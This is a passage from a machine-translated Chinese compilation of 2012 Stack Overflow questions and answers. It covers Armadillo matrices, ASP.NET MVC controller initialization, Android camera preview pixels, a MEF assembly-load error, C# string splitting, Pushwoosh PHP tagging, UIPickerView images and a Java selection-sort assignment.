        controller.managedObjectContext = self.managedObjectContext;

    }
    return YES;
} 
```

我如何将导航控制器用于模态视图？

我还应该注意我正在使用情节提要。

# c++ - 犰狳乘法的差异

> ID：13548042
> 
> 赞同：0
> 
> 时间：2012-11-25T03:37:45.433
> 
> 标签：c++, armadillo

> **可能重复：**
> [乘以 1.0 和 int <=> float 转换的精度](https://stackoverflow.com/questions/13400742/precision-of-multiplication-by-1-0-and-int-float-conversion)

我正在使用犰狳 c++ 线性库，并且难以获得一致的结果。当我打印向量 freq 时，这些是正确的值，但是当我将它与标量值相乘时，它是错误的。即使使用频率 * 1.0！任何建议都会很棒。

```
mat::fixed<621,1>freq; 
2.0 * arma::datum::pi * freq 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T02:45:53.573

我无法复制你的问题。

您需要发布演示问题的确切独立代码。换句话说，您正在使用的所有功能。这意味着您发布的程序可以在没有任何其他功能的情况下编译，并且仅使用 Armadillo 依赖项（即没有 Matlab）。

使用以下代码时，我没有遇到任何问题：

```
#include <iostream>
#include "armadillo"

using namespace arma;
using namespace std;

int main(int argc, char** argv)
  {
  mat::fixed<621,1> freq;
  freq.ones();

  cout << 2.0 * arma::datum::pi * freq << endl;

  return 0;
  } 
```

顺便说一句，谷歌搜索 matlab2arma() 函数（在问题的评论中提到）显示了第 3 方完成的黑客攻击。将固定大小的矩阵与涉及手动内存管理的任何类型的黑客混合使用可能会导致问题。除非您知道自己在做什么，否则不要修改内部 Armadillo 指针。

# asp.net-mvc - 无法覆盖 Controller 的 Initialize 方法

> ID：13548044
> 
> 赞同：1
> 
> 时间：2012-11-25T03:38:01.977
> 
> 标签：asp.net-mvc, asp.net-mvc-3, asp.net-mvc-2, asp.net-mvc-4

当我尝试覆盖控制器的初始化方法时，我得到'尝试方法'XXX.AccountController.Initialize（System.Web.Routing.RequestContext）'来访问方法'System.Web.Mvc.Controller.Initialize（System.Web. Routing.RequestContext)'失败'错误。

这就是它被覆盖的方式

```
 Protected Overrides Sub Initialize(ByVal requestContext As RequestContext)
        If FormsService Is Nothing Then FormsService = New FormsAuthenticationService()
        If MembershipService Is Nothing Then MembershipService = New AccountMembershipService()
        MyBase.Initialize(requestContext)
    End Sub 
```

这是堆栈跟踪。

```
 at XXXX.AccountController.Initialize(RequestContext requestContext) in $\Controllers\AccountController.vb:line 30
   at System.Web.Mvc.ControllerBase.Execute(RequestContext requestContext)
   at System.Web.Mvc.ControllerBase.System.Web.Mvc.IController.Execute(RequestContext requestContext)
   at System.Web.Mvc.MvcHandler.<>c__DisplayClass6.<>c__DisplayClassb.<BeginProcessRequest>b__5()
   at System.Web.Mvc.Async.AsyncResultWrapper.<>c__DisplayClass1.<MakeVoidDelegate>b__0()
   at System.Web.Mvc.Async.AsyncResultWrapper.<>c__DisplayClass8`1.<BeginSynchronous>b__7(IAsyncResult _)
   at System.Web.Mvc.Async.AsyncResultWrapper.WrappedAsyncResult`1.End()
   at System.Web.Mvc.MvcHandler.<>c__DisplayClasse.<EndProcessRequest>b__d()
   at System.Web.Mvc.SecurityUtil.<GetCallInAppTrustThunk>b__0(Action f)
   at System.Web.Mvc.SecurityUtil.ProcessInApplicationTrust(Action action)
   at System.Web.Mvc.MvcHandler.EndProcessRequest(IAsyncResult asyncResult)
   at System.Web.Mvc.MvcHandler.System.Web.IHttpAsyncHandler.EndProcessRequest(IAsyncResult result)
   at System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
   at System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously) 
```

我已将其从 MVC2 升级到 MVC3。

这是我的 web.config 文件。

```
<?xml version="1.0" encoding="utf-8"?>

<configuration>
  <configSections>
    <sectionGroup name="system.web.extensions" type="System.Web.Configuration.SystemWebExtensionsSectionGroup, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35">
      <sectionGroup name="scripting" type="System.Web.Configuration.ScriptingSectionGroup, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35">
        <section name="scriptResourceHandler" type="System.Web.Configuration.ScriptingScriptResourceHandlerSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" requirePermission="false" allowDefinition="MachineToApplication" />
        <sectionGroup name="webServices" type="System.Web.Configuration.ScriptingWebServicesSectionGroup, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35">
          <section name="jsonSerialization" type="System.Web.Configuration.ScriptingJsonSerializationSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" requirePermission="false" allowDefinition="Everywhere" />
          <section name="profileService" type="System.Web.Configuration.ScriptingProfileServiceSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" requirePermission="false" allowDefinition="MachineToApplication" />
          <section name="authenticationService" type="System.Web.Configuration.ScriptingAuthenticationServiceSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" requirePermission="false" allowDefinition="MachineToApplication" />
          <section name="roleService" type="System.Web.Configuration.ScriptingRoleServiceSection, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" requirePermission="false" allowDefinition="MachineToApplication" />
        </sectionGroup>
      </sectionGroup>
    </sectionGroup>
  </configSections>
  <appSettings>
    <add key="webpages:Version" value="1.0.0.0" />
    <add key="ClientValidationEnabled" value="true" />
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
  </appSettings>
  <connectionStrings>
    <clear />

  </connectionStrings>

  <system.web>

    <httpRuntime maxRequestLength="2097151" />

    <compilation debug="true" targetFramework="4.5">
      <assemblies>
        <add assembly="System.Web.WebPages, Version=1.0.0.0, Culture=neutral,       PublicKeyToken=31BF3856AD364E35" />
        <add assembly="System.Web.Helpers, Version=1.0.0.0, Culture=neutral,      PublicKeyToken=31BF3856AD364E35" />
        <add assembly="System.Web.Mvc, Version=4.0.0.0,  Culture=neutral,PublicKeyToken=31bf3856ad364e35" />
      </assemblies>
    </compilation>

    <authentication mode="Forms">
      <forms loginUrl="~/account/logon" timeout="2880" />
    </authentication>

    <customErrors mode="Off" />
    <pages controlRenderingCompatibilityVersion="4.0">
      <namespaces>
        <add namespace="System.Web.Helpers" />
        <add namespace="System.Web.Mvc" />
        <add namespace="System.Web.Mvc.Ajax" />
        <add namespace="System.Web.Mvc.Html" />
        <add namespace="System.Web.Routing" />
        <add namespace="System.Web.WebPages" />
      </namespaces>
      <controls>
        <add tagPrefix="asp" namespace="System.Web.UI" assembly="System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
        <add tagPrefix="asp" namespace="System.Web.UI.WebControls" assembly="System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      </controls>
    </pages>
    <httpHandlers>
      <remove verb="*" path="*.asmx" />
      <add verb="*" path="*.asmx" validate="false" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      <add verb="*" path="*_AppService.axd" validate="false" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      <add verb="GET,HEAD" path="ScriptResource.axd" validate="false" type="System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
    </httpHandlers>
    <httpModules>
      <add name="ScriptModule" type="System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      <add name="UrlRoutingModule" type="System.Web.Routing.UrlRoutingModule, System.Web.Routing, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
    </httpModules>
  </system.web>
  <!-- 
        The system.webServer section is required for running ASP.NET AJAX under Internet
        Information Services 7.0\.  It is not necessary for previous version of IIS.
  -->
  <system.webServer>
    <modules runAllManagedModulesForAllRequests="true">
      <remove name="UrlRoutingModule" />
      <remove name="ScriptModule" />
      <add name="ScriptModule" preCondition="managedHandler" type="System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      <add name="UrlRoutingModule" preCondition="" type="System.Web.Routing.UrlRoutingModule, System.Web.Routing, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
    </modules>
    <handlers>
      <remove name="WebServiceHandlerFactory-Integrated" />
      <remove name="ScriptHandlerFactory" />
      <remove name="ScriptHandlerFactoryAppServices" />
      <remove name="ScriptResource" />
      <remove name="UrlRoutingHandler" />
      <add name="ScriptHandlerFactory" verb="*" path="*.asmx" preCondition="integratedMode" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      <add name="ScriptHandlerFactoryAppServices" verb="*" path="*_AppService.axd" preCondition="integratedMode" type="System.Web.Script.Services.ScriptHandlerFactory, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      <add name="ScriptResource" verb="GET,HEAD" path="ScriptResource.axd" preCondition="integratedMode" type="System.Web.Handlers.ScriptResourceHandler, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35" />
      <add name="UrlRoutingHandler" verb="*" path="UrlRouting.axd" preCondition="integratedMode" type="System.Web.HttpForbiddenHandler, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
    </handlers>
    <validation validateIntegratedModeConfiguration="false" />
  </system.webServer>

  <runtime>
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <dependentAssembly>
        <assemblyIdentity name="System.Web.Mvc" publicKeyToken="31bf3856ad364e35" />
        <bindingRedirect oldVersion="1.0.0.0-2.0.0.0" newVersion="3.0.0.0" />
      </dependentAssembly>
    </assemblyBinding>
  </runtime>
</configuration> 
```

有人可以帮助我吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T07:24:13.927

尝试在您的 web.config 中更改 System.Web.Mvc 的程序集版本，如下所示

```
<assemblies>
    <add assembly="System.Web.Mvc, Version=3.0.0.0,  Culture=neutral,PublicKeyToken=31bf3856ad364e35" />
</assemblies> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T04:15:05.243

您可以尝试将`Overloads`关键字添加到您的签名中吗？

IE：

```
Protected Overloads Overrides Sub Initialize(ByVal requestContext As RequestContext)
  If FormsService Is Nothing Then FormsService = New FormsAuthenticationService()
  If MembershipService Is Nothing Then MembershipService = New AccountMembershipService()
  MyBase.Initialize(requestContext)
End Sub 
```

# android - Android相机像素操作

> ID：13548045
> 
> 赞同：3
> 
> 时间：2012-11-25T03:38:17.660
> 
> 标签：android, image-processing, camera, surfaceview

我正在尝试构建一个相机应用程序，该应用程序接受相机预览，操纵像素，然后显示新图像。我需要实时进行操作。

根据我在网上阅读的内容以及此处的问题，您需要制作自定义表面视图并通过该`onPreviewFrame`方法操作像素阵列。我已经构建了一个自定义表面视图并运行此方法。我已将其转换`YUV`为`RGB`.

现在，我的问题是，如何在屏幕上实时显示这个新的像素阵列？我是否以某种方式在`onPreviewFrame`方法中返回它？我必须更改`byte[]`数组吗？我是否需要使用新的像素阵列并使用位图显示它？有没有办法在`byte[]`不显示预览的情况下从相机预览中获取数组？

如果有人可以用代码示例回答这些问题，那就太好了！我对 Android 有点陌生，所以我需要解释清楚的答案让我理解。这是我运行相机预览的部分代码：

```
public void surfaceChanged(SurfaceHolder holder, int format, int w, int h) {
        // If your preview can change or rotate, take care of those events here.
        // Make sure to stop the preview before resizing or reformatting it.

        if (mHolder.getSurface() == null){
          // preview surface does not exist
          return;
        }

        // stop preview before making changes
        try {
            mCamera.stopPreview();
        } catch (Exception e){
          // ignore: tried to stop a non-existent preview
        }

        // start preview with new settings
        try {
            //parameters.setPreviewSize(w, h);
            mCamera.setParameters(parameters);
            mCamera.setPreviewDisplay(mHolder);
            mCamera.setPreviewCallback(new PreviewCallback() {
                public void onPreviewFrame(byte[] data, Camera camera)
                {
                    System.out.println("onPreviewFrame");
                    //transforms NV21 pixel data into RGB pixels  
                    decodeYUV420SP(pixels, data, previewSize.width,  previewSize.height);  

//Outuput the value of the top left pixel in the preview to LogCat  
                    Log.i("Pixels", "The top right pixel has the following RGB (hexadecimal) values:"  
                           +Integer.toHexString(pixels[0]));  

                }
            });
            mCamera.startPreview();

        } catch (Exception e){
            Log.d(null, "Error starting camera preview: " + e.getMessage());
        }
    } 
```

这给了我想要显示的 rgb 像素数组，而不是预览。我该怎么做呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T08:07:51.153

您无法操作连接到相机预览的表面。您收到的字节数组`onPreviewFrame()`只是框架在屏幕上显示的内容的副本。此外，您会发现这两个流是异步的：您可以减慢回调速度（例如，通过`sleep()`在您的回调中添加一些），但预览界面仍然会更新。

您可以通过在其上放置其他视图来隐藏预览，或者您可以通过使用而不是`SurfaceView`完全摆脱此视图（***注意：****在 API 级别 11 中添加*）。隐藏表面并不像看起来那么容易：框架可能会将其弹出到顶部，它需要仔细同步相机启动或重新启动与布局。`setPreviewTexture()``setPreviewDisplay()`

 **无论如何，隐藏表面后，您可以使用接收`onPreviewFrame()`到的字节数组生成图像并显示它。您可以根据自己的喜好随意操作像素。我相信最佳技术是将像素数据发送到 OpenGL：您可以使用着色器将 YCrCb (NV21) 到 RGB 的转换卸载到 GPU。**

# c# - 添加 MEF 后 MVC 应用程序崩溃

> ID：13548047
> 
> 赞同：3
> 
> 时间：2012-11-25T03:40:02.533
> 
> 标签：c#, asp.net-mvc, mef

我正在为一个班级开发一个开源 MVC 项目，一旦其他学生将 MEF 添加到项目中，它就停止为我运行。它仍然适用于其他所有人我已经研究了很长一段时间并询问了教授并且无法得到任何工作。

有关整个错误，请参阅以下内容

[http://pastebin.com/7qjanN3b](http://pastebin.com/7qjanN3b)

以下是错误页面每个部分的第一行 注意：

> [ReflectionTypeLoadException：无法加载一种或多种请求的类型。检索 LoaderExceptions 属性以获取更多信息。]

注意：这是错误页面上的一行，我认为这很奇怪。

> [InvalidOperationException：编写 MEF 部件时发生错误。类型：Microsoft.SqlServer.Management.Smo.SecurityUtils、Microsoft.SqlServer.Management.Smo.ExecutionManager、Microsoft.SqlServer.Management.Smo.ExecutionManager+ExecResult、Microsoft.SqlServer.Management.Smo.ExecutionStatus、
> 
> 删除了几百行垃圾，请查看完整错误的链接
> 
> Microsoft.SqlServer.Management.Smo.ScriptContainer，Microsoft.SqlServer.Management.Smo.ObjectScriptContainer，Microsoft.SqlServer.Management.Smo.IdBasedObjectScriptContainer，Microsoft.SqlServer.Management.Smo.TableScriptContainer，Microsoft.SqlServer.Management.Smo.ScriptContainerFactory， Microsoft.SqlServer.Management.Smo.SfcDiscoveryNode、Microsoft.SqlServer.Management.Smo.SfcHierarchyDiscovery、Microsoft.SqlServer.Management.Smo.SfcDependencyDiscovery、Microsoft.SqlServer.Management.Smo.SfcDependencyDiscovery+SfcNodeVisitor、Microsoft.SqlServer.Management.Smo。 SfcDependencyDiscovery+ScriptListContext、Microsoft.SqlServer.Management.Smo.SmoDependencyDiscovery、Microsoft.SqlServer.Management.Smo.ErrorLocation、Microsoft.SqlServer.Management.Smo.DependencyDiscoveryError、Microsoft.SqlServer.Management.Smo。DependencyDiscoverySink，{6700AF61-4E8B-4423-BE3B-A43DE0C1B3B3}，{6700AF61-4E8B-4423-BE3B-A43DE0C1B3B3}+_*StaticArrayInitTypeSize=24，Microsoft.SqlServer.Management.Smo.Server+d_0，Microsoft.SqlServer.Management.Smo.Database+d_0，Microsoft.SqlServer.Management.Smo.Database+* d_3 *，* Microsoft.SqlServer.Management.Smo .CpuCollection+d_ *0, Microsoft.SqlServer.Management.Smo.BackupMediaSet+<>c* _DisplayClass2, Microsoft.SqlServer.Management.Smo.BackupSet+<>c_ *DisplayClassa, Microsoft.SqlServer.Management.Smo.PropertyCollection+* d_0 , Microsoft.SqlServer .Management.Smo.ScriptMaker+d_2 *，Microsoft.SqlServer.Management.Smo.ScriptMaker+* d_8，Microsoft.SqlServer.Management.Smo.SmoDependencyOrderer+<>c_DisplayClass25 *，Microsoft.SqlServer.Management.Smo.DatabasePrefetchBase+d*_1, Microsoft.SqlServer.Management.Smo.ObjectScriptContainer+<>c__DisplayClass2, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 原因：无法加载文件或程序集 'Microsoft.SqlServer.SqlEnum, Version= 11.0.0.0，Culture=neutral，PublicKeyToken=89845dcd8080cc91' 或其依赖项之一。该系统找不到指定的文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T18:49:29.810

我将首先确认您的机器上的 GAC 中安装了 SqlEnum dll。您可以通过转到 C:\Windows\assembly 来检查这一点。如果缺少某些内容，您可能需要修复或重新安装 Sql 管理对象功能。还要检查您安装的版本是否与 MEF 尝试加载的版本相同。

如果您确实安装了它，请尝试使用[Fusion Log Viewer](http://msdn.microsoft.com/en-us/library/e74a18c4%28v=vs.71%29.aspx)。这可以帮助您[找到哪些 dll 加载失败](http://www.hanselman.com/blog/BackToBasicsUsingFusionLogViewerToDebugObscureLoaderErrors.aspx)，以及加载程序在尝试加载 dll 时执行了哪些步骤。这应该可以帮助您缩小问题的来源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T15:56:36.243

我相信您在某处缺少参考。我将回顾代码并确保您的所有“使用”语句都是应有的，以及项目对程序集的引用。

# c# - c# 中是否有一个 splitByCharacterType 方法，就像在 Java 中一样？

> ID：13548048
> 
> 赞同：1
> 
> 时间：2012-11-25T03:40:03.890
> 
> 标签：c#

在 Java 中有一个方法[splitByCharacterType](http://commons.apache.org/lang/api/org/apache/commons/lang3/StringUtils.html#splitByCharacterType%28java.lang.String%29)，它接受一个字符串，例如`0015j8*(`，并将其拆分为`"0015","j","8","*","("`. c#中有这样的内置函数吗？如果不是，我将如何构建一个功能来做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T04:10:54.990

```
public static IEnumerable<string> SplitByCharacterType(string input)
{
    if (String.IsNullOrEmpty(input))
        throw new ArgumentNullException(nameof(input));

    StringBuilder segment = new StringBuilder();
    segment.Append(input[0]);
    var current = Char.GetUnicodeCategory(input[0]);

    for (int i = 1; i < input.Length; i++)
    {
        var next = Char.GetUnicodeCategory(input[i]);
        if (next == current)
        {
            segment.Append(input[i]);
        }
        else
        {
            yield return segment.ToString();
            segment.Clear();
            segment.Append(input[i]);
            current = next;
        }
    }
    yield return segment.ToString();
} 
```

用法如下：

```
string[] split = SplitByCharacterType("0015j8*(").ToArray(); 
```

结果是`"0015","j","8","*","("`

我建议您将其作为扩展方法来实现。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-25T04:00:28.647

我不认为这种方法存在。您可以按照以下步骤创建自己的实用程序方法：

1.  创建一个列表来保存拆分字符串
2.  使用所有字符类型定义字符串，例如

    ```
     string numberString = "0123456789";
     string specialChars = "~!@#$%^&*(){}|\/?";
     string alphaChars = "abcde....XYZ"; 
    ```

3.  定义一个变量来保存临时字符串
4.  定义一个变量来记录字符的类型
5.  遍历您的字符串，一次一个字符，通过检查预定义类型字符串中是否存在字符来检查字符的类型。
6.  如果类型比前一个类型新（检查类型变量值），则将临时字符串（非空）添加到列表中，将新类型分配给类型变量并将当前字符分配给临时字符串。如果不是这样，则将 char 附加到临时字符串。
7.  在遍历结束时，将临时字符串（非空）添加到列表中
8.  现在您的列表包含拆分字符串。
9.  将列表转换为字符串数组，您就完成了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-25T04:08:17.987

您也许可以使用正则表达式类，如下所示，但您需要添加对数字和字母以外的其他字符的支持。

```
 var chars = Regex.Matches("0015j8*(", @"((?:""[^""\\]*(?:\\.[^""\\]*)*"")|[a-z]|\d+)").Cast<Match>().Select(match => match.Value).ToArray(); 
```

结果 0015,J,8

# php - Pushwoosh Phonegap 通知 PHP 方法集标签

> ID：13548049
> 
> 赞同：1
> 
> 时间：2012-11-25T03:40:27.663
> 
> 标签：php, javascript, android, cordova, push-notification

我不是专业的程序员。我使用 PHP 和 Javascript 进行管理，但我很难将 Pushwoosh 方法转换为功能性 PHP 或 Javascript。这是我需要帮助转换的方法：

方法 /setTags

为设备设置标签值

要求：

```
{
  "request":{
    "application":"DEAD0-BEEF0",
    "hwid": 'device hardware id',
    "tags": {
      "tag1": "string value",
      "tag2": 42,
      "tag3": "string",
      "tag4": 3.14
    }
  }
} 
```

这就是他们发布方法的方式。有什么帮助吗？

我为 setTags 编写了一个 PHP，但我还无法验证它，因为我仍在努力检索令牌。我在这个链接上有一个问题：

[Phonegap/Pushwoosh Android 检索设备 ID/令牌](https://stackoverflow.com/questions/13633236/phonegap-pushwoosh-android-retrieving-device-id-token)

这是我用于 setTags 的 PHP。使用 JSON 看起来是否正确？（我的项目迟到了！）

```
<?php

define('PW_AUTH', 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx');
define('PW_APPLICATION', 'xxxxxxxxxx');
define('HW_ID', 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx');

function doPostRequest($url, $data, $optional_headers = null) {
    $params = array(
        'http' => array(
            'method' => 'POST',
            'content' => $data
        ));
    if ($optional_headers !== null)
        $params['http']['header'] = $optional_headers;

    $ctx = stream_context_create($params);
    $fp = fopen($url, 'rb', false, $ctx);
    if (!$fp)
        throw new Exception("Problem with $url, $php_errmsg");

    $response = @stream_get_contents($fp);
    if ($response === false)
        return false;
    return $response;
}

function pwCall( $action, $data = array() ) {
    $url = 'https://cp.pushwoosh.com/json/1.3/' . $action;
    $json = json_encode( array( 'request' => $data ) );
    $res = doPostRequest( $url, $json, 'Content-Type: application/json' );
    print_r( @json_decode( $res, true ) );
}

pwCall( 'setTags', array(
    'application' => PW_APPLICATION,
    'auth' => PW_AUTH,
    'hwid' => HW_ID,
    'tags' => array(
                array(
                    'tag1' => 'string value',
                    'tag2' => 42,
                    'tag3' => 'string',
                    'tag4' => 3.14
                )
            )
        )
    ); 
```

?>

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T17:41:56.723

您无需转换此 JSON 即可将标签发送到 Pushwoosh。它直接从设备发送到 Pushwoosh 服务器。

# ios - 自定义 UIPicker

> ID：13548055
> 
> 赞同：0
> 
> 时间：2012-11-25T03:41:31.113
> 
> 标签：ios, uipickerview

我一直在开发具有 3 个 uipicker 的应用程序。我想在每个 uipicker 中实现图像。但是，如下图所示，它只影响一个 uipicker，而不是全部。我想知道如何自定义图像中显示的所有 uipicker 元素![在此处输入图像描述](../Images/b95aa6ef36ab1addc8e4f4c22ed1e7e7.png)

```
 - (void)loadView
    {
        picker1 = [[UIPickerView alloc] initWithFrame:CGRectMake(30, 200, 250, 250)];
        picker1.delegate = self;
        picker1.dataSource = self;
        picker1.showsSelectionIndicator = YES;
        picker1.tag=1;

        picker2 = [[UIPickerView alloc] initWithFrame:CGRectMake(390, 200, 250, 250)];
        picker2.delegate = self;
        picker2.dataSource = self;
        picker2.showsSelectionIndicator = YES;
        picker2.tag=2;

        picker3 = [[UIPickerView alloc] initWithFrame:CGRectMake(750, 200, 250, 250)];
        picker3.delegate = self;
        picker3.dataSource = self;
        picker3.showsSelectionIndicator = YES;
        picker3.tag=3;

        self.view = [[UIView alloc] initWithFrame:CGRectZero];
        self.view.backgroundColor=[UIColor whiteColor];

        [self.view addSubview:picker1];
        [self.view addSubview:picker2];
        [self.view addSubview:picker3];

        UIImage *seven = [UIImage imageNamed:@"seven.png"];
        UIImage *bar = [UIImage imageNamed:@"bar.png"];

        for(int i=1; i<=4; i++)
        {
            UIImageView *sevenView = [[UIImageView alloc] initWithImage:seven];
            UIImageView *barView = [[UIImageView alloc] initWithImage:bar];

            NSArray *imageViewArray = [[NSArray alloc] initWithObjects:
                                       sevenView,barView,nil];

            NSString *fieldName = [[NSString alloc] initWithFormat:@"column%d",i];
            [self setValue:imageViewArray forKey:fieldName];
        }

    }

    -(UIView *)pickerView:(UIPickerView *)pickerView
               viewForRow:(NSInteger)row
             forComponent:(NSInteger)component reusingView:(UIView *)view
    {
        //NSLog(@"%d",component);
        NSLog(@"tag: %d",pickerView.tag);

        if(pickerView.tag==1)
        {   NSString *arrayName = [[NSString alloc] initWithFormat:@"column%d",component+1];
            NSArray *array1 = [self valueForKey:arrayName];
            return [array1 objectAtIndex:row];
        }
        else if(pickerView.tag==2)
        {   NSString *arrayName = [[NSString alloc] initWithFormat:@"column%d",component+1];
            NSArray *array2 = [self valueForKey:arrayName];
            return [array2 objectAtIndex:row];
        }
        else
        {   NSString *arrayName = [[NSString alloc] initWithFormat:@"column%d",component+1];
            NSArray *array3 = [self valueForKey:arrayName];
            return [array3 objectAtIndex:row];
        }

    }

    - (void)didReceiveMemoryWarning {
        [super didReceiveMemoryWarning]; // Releases the view if it doesn't have a superview
        // Release anything that's not essential, such as cached data
    }

    - (void)dealloc {

    }

    #pragma mark UIPickerViewDelegate methods

    - (NSString*)pickerView:(UIPickerView*)pv titleForRow:(NSInteger)row forComponent:(NSInteger)component
    {
        return [NSString stringWithFormat:@"%d",row];
    }

    #pragma mark UIPickerViewDataSource methods

    - (NSInteger)numberOfComponentsInPickerView:(UIPickerView*)pv
    {
        return 4;
    }

    - (NSInteger)pickerView:(UIPickerView*)pv numberOfRowsInComponent:(NSInteger)component
    {
        return 2;
    }

    @end 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T04:40:40.623

视图只能有一个父级。但是您正在尝试将每个视图用于 3 个父母（3 个选择器）。无论选择器如何，您都尝试为每个选择器的组件 X 使用相同的图像视图集。那是行不通的。

您需要三组数组，而不仅仅是一组。换句话说，您不能在选择器之间共享视图。

# java - 具有多参数构造函数的选择排序

> ID：13548056
> 
> 赞同：0
> 
> 时间：2012-11-25T03:41:32.440
> 
> 标签：java

我正在为我的大学的 CS 140 课程做一个项目，我正在尝试创建一个程序，该程序使用选择排序，其中包含美国 50 个州的数组，其中包含名称、人口、首都和地区的字段。这是给定的数组：

```
private static void loadStates() {
    // Set the search key to be the state name.
    State.setKey("name");

    us = new Country("United States", 311591917, "Washington DC",
            new State[]{
                new State("Alabama", 4802740, "Montgomery", "Southeast"),
                new State("Alaska", 722718, "Juneau", "West"),
                new State("Arizona", 6482505, "Phoenix", "Southwest"),
                new State("Arkansas", 2937979, "Little Rock", "Southeast"),
                new State("California", 37691912, "Sacramento", "West"),
                new State("Colorado", 5116769, "Denver", "West"),
                new State("Connecticut", 3580709, "Hartford", "Northeast"),
                new State("Delaware", 907135, "Dover", "Northeast"),
                new State("Florida", 19057542, "Tallahassee", "Southeast"),
                new State("Georgia", 9815210, "Atlanta", "Southeast"),
                new State("Hawaii", 1374810, "Honolulu", "West"),
                new State("Idaho", 1584985, "Boise", "West"),
                new State("Illinois", 12869257, "Springfield", "Midwest"),
                new State("Indiana", 6516922, "Indianapolis", "Midwest"),
                new State("Iowa", 3062309, "Des Moines", "Midwest"),
                new State("Kansas", 2871238, "Topeka", "Midwest"),
                new State("Kentucky", 4369356, "Frankfurt", "Southeast"),
                new State("Louisiana", 4574836, "Baton Rouge", "Southeast"),
                new State("Maine", 1328188, "Augusta", "Northeast"),
                new State("Maryland", 5828289, "Annapolis", "Northeast"),
                new State("Massachusetts", 6587536, "Boston", "Northeast"),
                new State("Michigan", 9876187, "Lansing", "Midwest"),
                new State("Minnesota", 5344861, "St. Paul", "Midwest"),
                new State("Mississippi", 2978512, "Jackson", "Southeast"),
                new State("Missouri", 6010688, "Jefferson City", "Midwest"),
                new State("Montana", 998199, "Helena", "West"),
                new State("Nebraska", 1842641, "Lincoln", "Midwest"),
                new State("Nevada", 2723322, "Carson City", "West"),
                new State("New Hampshire", 1318194, "Concord", "Northeast"),
                new State("New Jersey", 8821155, "Trenton", "Northeast"),
                new State("New Mexico", 2082224, "Santa Fe", "Southwest"),
                new State("New York", 19465197, "Albany", "Northeast"),
                new State("North Carolina", 9656401, "Raleigh", "Southeast"),
                new State("North Dakota", 683932, "Bismarck", "Midwest"),
                new State("Ohio", 11544951, "Columbus", "Midwest"),
                new State("Oklahoma", 3791508, "Oklahoma City", "Southwest"),
                new State("Oregon", 3871859, "Salem", "West"),
                new State("Pennsylvania", 12742886, "Harrisburg", "Northeast"),
                new State("Rhode Island", 1051302, "Providence", "Northeast"),
                new State("South Carolina", 4679230, "Columbia", "Southeast"),
                new State("South Dakota", 824082, "Pierre", "Midwest"),
                new State("Tennessee", 6403353, "Nashville", "Southeast"),
                new State("Texas", 25674681, "Austin", "Southwest"),
                new State("Utah", 2817222, "Salt Lake City", "West"),
                new State("Vermont", 4802740, "Montpelier", "Northeast"),
                new State("Virginia", 8096604, "Richmond", "Southeast"),
                new State("Washington", 6830038, "Olympia", "West"),
                new State("West Virginia", 1855364, "Charleston", "Southeast"),
                new State("Wisconsin", 5711767, "Madison", "Midwest"),
                new State("Wyoming", 568158, "Cheyenne", "West")
            });
} // end loadStates() 
```

依此类推，适用于每个州。这是我的选择排序。根据教授的要求，它分为三种方法。

```
